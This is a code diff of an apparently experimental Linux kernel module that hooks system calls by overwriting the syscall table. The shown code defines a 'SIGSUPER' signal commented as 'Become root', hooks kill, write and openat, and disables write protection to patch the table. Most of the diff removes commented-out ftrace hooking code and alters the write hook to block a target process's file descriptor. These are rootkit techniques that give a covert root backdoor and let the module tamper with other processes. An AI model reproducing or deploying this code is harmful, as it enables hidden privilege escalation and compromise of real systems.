@@ -13,22 +13,13 @@
 #include <linux/ip.h>
 #include <linux/icmp.h>
 #include <linux/ftrace.h>
-
 #include <linux/list.h>
 
 // Syscall table address pointer
 unsigned long *__sys_call_table_addr;
 
-//static struct nf_hook_ops nfho;
 unsigned int target_fd = 0;
 unsigned int target_pid = 0;
-
-// Structure that represents ftrace hook
-struct ftrace_hook {
-    const char *name;
-    void *function;
-    struct ftrace_ops ops;
-};
 
 enum signals {
     SIGSUPER = 64, // Become root
@@ -67,17 +58,6 @@ static unsigned long lookup_name(const char *name)
 }
 
 #endif
-
-//#if LINUX_VERSION_CODE < KERNEL_VERSION(5,11,0)
-//
-//#define ftrace_regs pt_regs
-//
-//static __always_inline struct pt_regs *ftrace_get_regs(struct ftrace_regs *fregs)
-//{
-//    return fregs;
-//}
-//
-//#endif
 
 #ifdef KPROBE_
 
@@ -127,15 +107,6 @@ static void protect_memory(void)
 // Modified syscalls
 #ifdef PTREGS_MODIF
 
-//#define SYSCALL_NAME(name) ("__x64_" name)
-//
-//#define FTRACE_HOOK(_name, _original_function, _modified_function)          \
-//    {                                                                       \
-//        .name = SYSCALL_NAME(_name),                                        \
-//        .original_function = (_original_function),                          \
-//        .modified_function = (_modified_function),                          \
-//    }
-
 static asmlinkage long hack_kill_syscall(const struct pt_regs* regs)
 {
     int sig = regs->si;
@@ -170,14 +141,19 @@ static asmlinkage long fh_sys_write(struct pt_regs *regs)
 {
 	long ret;
 	struct task_struct *task = current;
+    int signum = SIGKILL;
 
 	if (task->pid == target_pid) {
-        pr_info("writing to a file with descriptor %d\n", target_fd);
+        pr_info("regs->di: %d\n", regs->di);
+        pr_info("target_fd: %d\n", target_fd);
 
-		if (regs->di + 1 == target_fd) {
-            printk(KERN_INFO "Target has been killed\n");
-            return 0;
+		if (regs->di == target_fd) {
+            pr_info("No access!!!!\n");
+
+            return -EPERM;
         }
+
+        pr_info("Ta blyat :(\n");
     }
 
 	return orig_sys_write(regs);
@@ -192,7 +168,7 @@ static asmlinkage long fh_sys_openat(struct pt_regs *regs)
 
 	kernel_filename = duplicate_filename((void*) regs->si);
 
-	if (strncmp(kernel_filename, "/tmp/test.txt", 13) == 0) {
+	if (strcmp(kernel_filename, "/tmp/test.txt") == 0) {
 		pr_info("our file is opened by process with id: %d\n", task->pid);
 		pr_info("opened file : %s\n", kernel_filename);
 		kfree(kernel_filename);
@@ -264,133 +240,8 @@ static void hook_write(void)
 static void restore_write(void)
 {
     /* Restore syscall table */
-    __sys_call_table_addr[__NR_write] = (unsigned long)&orig_sys_write;
+    __sys_call_table_addr[__NR_write] = (unsigned long)orig_sys_write;
 }
-
-//static int save_original_ftraceh(struct ftrace_hook *hook)
-//{
-//    hook->address = lookup_name(hook->name);
-//
-//    if (!hook->address) {
-//        pr_debug("unresolved symbol: %s\n", hook->name);
-//        return -ENOENT;
-//    }
-//
-//    *((unsigned long*) hook->original_function) = hook->address;
-//
-//    return 0;
-//}
-//
-//static void notrace create_callback(unsigned long ip, unsigned long parent_ip,
-//                                    struct ftrace_ops *ops, struct ftrace_regs *fregs)
-//{
-//    struct pt_regs *regs = ftrace_get_regs(fregs);
-//    struct ftrace_hook *hook = container_of(ops, struct ftrace_hook, ops);
-//
-//    if (!within_module(parent_ip, THIS_MODULE))
-//        regs->ip = (unsigned long)hook->modified_function;
-//}
-//
-//static int register_ftrace_hook(struct ftrace_hook *hook)
-//{
-//    if (save_original_ftraceh(hook) != 0) return -1;
-//
-//    hook->ops.func = create_callback;
-//    hook->ops.flags = FTRACE_OPS_FL_SAVE_REGS
-//                      | FTRACE_OPS_FL_RECURSION
-//                      | FTRACE_OPS_FL_IPMODIFY;
-//
-//    int err = ftrace_set_filter_ip(&hook->ops, hook->address, 0, 0);
-//
-//    if (err) {
-//        pr_debug("ftrace_set_filter_ip() failed: %d\n", err);
-//        return err;
-//    }
-//
-//    err = register_ftrace_function(&hook->ops);
-//    if (err) {
-//        pr_debug("register_ftrace_function() failed: %d\n", err);
-//        ftrace_set_filter_ip(&hook->ops, hook->address, 1, 0);
-//        return err;
-//    }
-//
-////    list_add(&hook->list, &hook_list);
-//
-//    return 0;
-//}
-//
-//void fh_remove_hook(struct ftrace_hook *hook)
-//{
-//    int err;
-//
-//    err = unregister_ftrace_function(&hook->ops);
-//    if (err) {
-//        pr_debug("unregister_ftrace_function() failed: %d\n", err);
-//    }
-//
-//    err = ftrace_set_filter_ip(&hook->ops, hook->address, 1, 0);
-//    if (err) {
-//        pr_debug("ftrace_set_filter_ip() failed: %d\n", err);
-//    }
-//}
-//
-//void fh_remove_hooks(struct ftrace_hook *hooks, size_t count)
-//{
-////    struct ftrace_hook *h, *tmp;
-////
-////    list_for_each_entry(h, &hook_list, list) {
-////        int err = unregister_ftrace_function(&h->ops);
-////        if (err) pr_debug("unregister_ftrace_function() failed: %d\n", err);
-////
-////        ftrace_set_filter_ip(&h->ops, h->address, 1, 0);
-////    }
-////
-////    msleep(5);
-////
-////    list_for_each_entry_safe(h, tmp, &hook_list, list) {
-////        list_del(&h->list);
-////        kfree(h);
-////    }
-//
-//    size_t i;
-//
-//    for (i = 0; i < count; i++)
-//        fh_remove_hook(&hooks[i]);
-//}
-//
-//int fh_install_hooks(struct ftrace_hook *hooks, size_t count)
-//{
-////    struct ftrace_hook *hook_entry;
-////    int err;
-////
-////    list_for_each_entry(hook_entry, &hook_list, list) {
-////        err = register_ftrace_function(&hook_entry->ops);
-////
-////        if (err) {
-////            fh_remove_hooks();
-////        }
-////    }
-//
-//    int err;
-//    size_t i;
-//
-//    for (i = 0; i < count; i++) {
-//        err = register_ftrace_hook(&hooks[i]);
-//        if (err) {
-//            while (i != 0) {
-//                fh_remove_hook(&hooks[--i]);
-//            }
-//            return err;
-//        }
-//    }
-//
-//    return 0;
-//}
-
-//static struct ftrace_hook demo_hooks[] = {
-//        FTRACE_HOOK("sys_write", &orig_sys_write, fh_sys_write),
-//        FTRACE_HOOK("sys_openat", &orig_sys_openat, fh_sys_openat)
-//};
 
 // Function that launches when module is inserted
 static int __init mod_init(void)
@@ -426,20 +277,6 @@ static int __init mod_init(void)
     hook_write();
     protect_memory();
 
-//    struct ftrace_hook write_hook = FTRACE_HOOK("sys_write", &orig_sys_write, fh_sys_write);
-//    struct ftrace_hook openat_hook = FTRACE_HOOK("sys_openat", &orig_sys_openat, fh_sys_openat);
-//
-//    list_add(&write_hook.list, &hook_list);
-//    list_add(&openat_hook.list, &hook_list);
-
-//    int err;
-//
-//    err = fh_install_hooks(demo_hooks, ARRAY_SIZE(demo_hooks));
-//    if (err)
-//        return err;
-//
-//    pr_info("module loaded\n");
-
     return 0;
 }
 
@@ -454,10 +291,6 @@ static void __exit mod_exit(void)
     restore_openat();
     restore_write();
     protect_memory();
-
-//    fh_remove_hooks(demo_hooks, ARRAY_SIZE(demo_hooks));
-//
-//    pr_info("module unloaded\n");
 }
 
 
